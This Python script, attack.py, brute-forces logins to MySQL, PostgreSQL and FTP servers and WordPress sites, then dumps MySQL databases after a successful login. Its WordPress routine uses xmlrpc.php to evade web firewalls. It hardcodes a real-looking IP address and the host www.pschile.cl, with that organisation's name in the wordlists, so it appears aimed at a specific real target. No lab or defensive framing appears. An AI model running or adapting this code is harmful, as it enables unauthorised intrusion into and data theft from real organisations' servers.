"""attack.py — focused credential attack against MySQL, PostgreSQL, or FTP on a single target."""

import argparse
import itertools
import os
import sys
from time import time

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
WORDLISTS_DIR = os.path.join(BASE_DIR, 'wordlists')

FALLBACK_USERNAMES = ['root', 'admin', 'cpanel', 'webmaster', 'pschile']
FALLBACK_PASSWORDS = ['', 'admin', 'password', '123456', 'pschile']


def load_wordlist(keyword: str, fallback: list) -> list:
    """Find and load a wordlist file whose name contains the given keyword.

    Args:
        keyword (str): Keyword to match in filename (e.g. 'user', 'pass').
        fallback (list): Default list if no file found.

    Returns:
        list: Lines from matched file, or fallback.
    """
    try:
        for filename in os.listdir(WORDLISTS_DIR):
            if keyword.lower() in filename.lower() and filename.endswith('.txt'):
                filepath = os.path.join(WORDLISTS_DIR, filename)
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = [line.strip() for line in f if line.strip()]
                print(f"[WORDLIST] Loaded {len(lines)} entries from {filename}")
                return lines
    except FileNotFoundError:
        pass
    print(f"[WORDLIST] No file found for '{keyword}' — using fallback ({len(fallback)} entries)")
    return fallback


def attack_mysql(ip: str, port: int, credentials: list):
    """Brute force MySQL with given credentials, dump DB on success.

    Args:
        ip (str): Target IP.
        port (int): MySQL port.
        credentials (list): List of (username, password) tuples.
    """
    import socket
    import struct
    import hashlib
    import time
    import requests

    def brute_wordpress(url, username, passwords):
        login_url = f"{url}/wp-login.php"
        for pwd in passwords:
            data = {
                'log': username,
                'pwd': pwd,
                'wp-submit': 'Log In',
                'redirect_to': '/wp-admin/',
                'testcookie': '1'
            }
            cookies = {'wordpress_test_cookie': 'WP Cookie check'}
            r = requests.post(login_url, data=data, cookies=cookies, allow_redirects=False)
            
            # Success = redirects to /wp-admin/
            if r.status_code == 302 and '/wp-admin/' in r.headers.get('Location', ''):
                print(f"[+] FOUND: {username}:{pwd}")
                return pwd
            print(f"[-] {pwd}")



    def parse_banner(banner: bytes):
        try:
            payload = banner[4:]
            if payload[0] != 10:
                return 'unknown', b''
            version_end = payload.index(b'\x00', 1)
            version = payload[1:version_end].decode('utf-8', errors='ignore').replace('5.5.5-', '')
            offset = version_end + 1 + 4
            salt1 = payload[offset:offset + 8]
            offset2 = offset + 8 + 1 + 2 + 1 + 2 + 2 + 1 + 10
            salt2 = payload[offset2:offset2 + 12]
            salt = salt1 + salt2
            return version, salt if len(salt) >= 16 else b''
        except Exception:
            return 'unknown', b''

    def native_password(password: str, salt: bytes) -> bytes:
        pwd = password.encode('utf-8')
        h1 = hashlib.sha1(pwd).digest()
        h2 = hashlib.sha1(h1).digest()
        h3 = hashlib.sha1(salt + h2).digest()
        return bytes(a ^ b for a, b in zip(h1, h3))

    def test(username, password):
        time.sleep(0.5)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            raw = sock.recv(1024)
            _, salt = parse_banner(raw)
            if not salt:
                sock.close()
                return 'no_salt'
            auth = native_password(password, salt) if password else b''
            uname = username.encode() + b'\x00'
            auth_data = bytes([len(auth)]) + auth if password else b'\x00'
            caps = 0x0200 | 0x8000 | 0x0004
            payload = (
                struct.pack('<I', caps)[:3] + b'\x00' +
                struct.pack('<I', 16777216)[:3] + b'\x00' +
                b'\x00' * 23 + uname + auth_data
            )
            packet = struct.pack('<I', len(payload))[:3] + b'\x01' + payload
            sock.send(packet)
            resp = sock.recv(1024)
            sock.close()
            if not resp or len(resp) < 5:
                return 'empty'
            m = resp[4]
            if m == 0x00:
                return 'success'
            elif m == 0xFF:
                return 'wrong_password'
            elif m == 0xFE:
                return 'auth_switch'
            return f'unknown:{hex(m)}'
        except Exception as e:
            return str(e)

    # Get version first
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((ip, port))
        banner = sock.recv(1024)
        sock.close()
        version, _ = parse_banner(banner)
        print(f"[MySQL] Version: {version}")
    except Exception as e:
        print(f"[MySQL] Could not connect: {e}")
        return

    total = len(credentials)
    print(f"[MySQL] Testing {total} combinations...")

    for i, (username, password) in enumerate(credentials):
        if i % 10 == 0:
            print(f"[MySQL] Progress: {i}/{total} ({i*100//total}%)")
        result = test(username, password)
        display = f"{username}:{password if password else '(empty)'}"
        if result == 'success':
            print(f"[MySQL] *** VALID: {display} ***")
            _dump_mysql(ip, port, username, password)
            return
        elif result == 'wrong_password':
            print(f"[MySQL] Invalid: {display}")
        else:
            print(f"[MySQL] Error {display}: {result}")

    print("[MySQL] No valid credentials found.")


def _dump_mysql(ip: str, port: int, username: str, password: str):
    """Dump MySQL databases using valid credentials.

    Args:
        ip (str): Target IP.
        port (int): MySQL port.
        username (str): Valid username.
        password (str): Valid password.
    """
    from src.utils.extractors.mysql_dump import MySQLDumper
    dumper = MySQLDumper(ip, port, username, password)
    dumper.run()


def attack_postgres(ip: str, port: int, credentials: list):
    """Brute force PostgreSQL with given credentials.

    Args:
        ip (str): Target IP.
        port (int): PostgreSQL port.
        credentials (list): List of (username, password) tuples.
    """
    import socket
    import struct
    import hashlib
    import time

    def test(username, password):
        time.sleep(0.5)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))

            # Startup message
            user = username.encode() + b'\x00'
            db = username.encode() + b'\x00'
            params = b'user\x00' + user + b'database\x00' + db + b'\x00'
            msg = struct.pack('>I', len(params) + 8) + struct.pack('>I', 196608) + params
            sock.send(msg)
            resp = sock.recv(1024)
            sock.close()

            if not resp:
                return 'no_response'
            code = chr(resp[0])
            if code == 'R':
                auth_type = struct.unpack('>I', resp[5:9])[0]
                if auth_type == 0:
                    return 'success'
                elif auth_type == 5:
                    return 'md5_required'  # need MD5 auth
                return f'auth_type:{auth_type}'
            elif code == 'E':
                return 'access_denied'
            return f'unknown:{code}'
        except Exception as e:
            return str(e)

    print(f"[PostgreSQL] Testing {len(credentials)} combinations...")
    total = len(credentials)

    for i, (username, password) in enumerate(credentials):
        if i % 10 == 0:
            print(f"[PostgreSQL] Progress: {i}/{total} ({i*100//total}%)")
        result = test(username, password)
        display = f"{username}:{password if password else '(empty)'}"
        if result == 'success':
            print(f"[PostgreSQL] *** VALID: {display} ***")
            return
        elif result == 'access_denied':
            print(f"[PostgreSQL] Invalid: {display}")
        else:
            print(f"[PostgreSQL] {display}: {result}")

    print("[PostgreSQL] No valid credentials found.")


def attack_ftp(ip: str, port: int, credentials: list):
    """Brute force FTP with given credentials.

    Args:
        ip (str): Target IP.
        port (int): FTP port.
        credentials (list): List of (username, password) tuples.
    """
    import socket
    import time

    def test(username, password):
        time.sleep(0.5)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            sock.recv(1024)  # banner

            sock.send(f"USER {username}\r\n".encode())
            resp = sock.recv(1024).decode('utf-8', errors='ignore')
            if '331' not in resp:
                sock.close()
                return f'unexpected_user_resp: {resp.strip()}'

            sock.send(f"PASS {password}\r\n".encode())
            resp = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()

            if '230' in resp:
                return 'success'
            elif '530' in resp:
                return 'wrong_password'
            return f'unknown: {resp.strip()}'
        except Exception as e:
            return str(e)

    total = len(credentials)
    print(f"[FTP] Testing {total} combinations...")

    for i, (username, password) in enumerate(credentials):
        if i % 10 == 0:
            print(f"[FTP] Progress: {i}/{total} ({i*100//total}%)")
        result = test(username, password)
        display = f"{username}:{password if password else '(empty)'}"
        if result == 'success':
            print(f"[FTP] *** VALID: {display} ***")
            return
        elif result == 'wrong_password':
            print(f"[FTP] Invalid: {display}")
        else:
            print(f"[FTP] Error {display}: {result}")

    print("[FTP] No valid credentials found.")

def brute_wordpress_xmlrpc(url, username, passwords, host=None):
    """Brute force WordPress via xmlrpc.php — often bypasses WAF on wp-login.php."""
    import requests
    xmlrpc_url = f"{url}/xmlrpc.php"
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Content-Type': 'text/xml'
    })
    if host:
        session.headers.update({'Host': host})
    for pwd in passwords:
        payload = f"""<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{pwd}</string></value></param>
  </params>
</methodCall>"""
        try:
            r = session.post(xmlrpc_url, data=payload, timeout=10)
            if '<isAdmin>' in r.text:
                print(f"[+] FOUND: {username}:{pwd}")
                return pwd
            print(f"[-] {pwd}")
        except requests.exceptions.Timeout:
            print(f"[!] Timeout on {pwd}, skipping")
        import time
        time.sleep(0.5)
    print("[WORDPRESS] No valid credentials found")
    return None

def main():
    """Parse arguments and launch the appropriate attack."""
    parser = argparse.ArgumentParser(description='Focused credential attack — MySQL, PostgreSQL, or FTP')
    parser.add_argument('--ip', required=True, help='Target IP address')
    parser.add_argument('--port', required=True, type=int, help='Target port')
    args = parser.parse_args()

    usernames = load_wordlist('user', FALLBACK_USERNAMES)
    passwords = load_wordlist('pass', FALLBACK_PASSWORDS)
    credentials = list(itertools.product(usernames, passwords))
    print(f"[ATTACK] {len(credentials)} total combinations against {args.ip}:{args.port}")

    if args.port == 3306:
            attack_mysql(args.ip, args.port, credentials)
    elif args.port == 5432:
            attack_postgres(args.ip, args.port, credentials)
    elif args.port == 21:
            attack_ftp(args.ip, args.port, credentials)
    elif args.port == 80:
            brute_wordpress_xmlrpc("http://162.241.218.115", "admin", passwords, host="www.pschile.cl")
    else:
            print(f"[ATTACK] Unknown port {args.port} — add handler for this service")
            sys.exit(1)

if __name__ == '__main__':
    main()